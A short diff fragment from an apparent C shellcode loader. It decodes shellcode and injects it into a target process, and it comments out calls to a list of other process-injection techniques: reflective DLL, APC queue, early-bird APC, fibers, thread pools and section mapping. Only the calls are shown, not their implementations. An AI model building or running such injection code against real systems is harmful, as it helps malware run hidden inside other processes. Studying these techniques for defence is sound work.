@@ -39,14 +39,14 @@ int main()
 	// Now you have the decoded shellcode in the buffer
 	// You can use the buffer and buffer_size as needed
 	InjectShellcodeRemoteProcess(TargetProcessId, outputBuffer, arrayLen);
-	DllInjectionRemoteProcess(TargetProcessId);
-	ReflectiveDllInjection();
-	RunFromPeResources();
-	ApcQueueCodeInjection();
-	EarlyBirdApcQueueInjection();
-	ExecuteModuleShellcodeUsingFiber();
-	ModuleExecutionThroughThreadPool();
-	MapViewOfSectionCodeInjection(TargetProcessId);
+	// DllInjectionRemoteProcess(TargetProcessId);
+	// ReflectiveDllInjection();
+	// RunFromPeResources();
+	// ApcQueueCodeInjection();
+	// EarlyBirdApcQueueInjection();
+	// ExecuteModuleShellcodeUsingFiber();
+	// ModuleExecutionThroughThreadPool();
+	// MapViewOfSectionCodeInjection(TargetProcessId);
 
 	// Free the allocated buffer when done
 	free(outputBuffer);
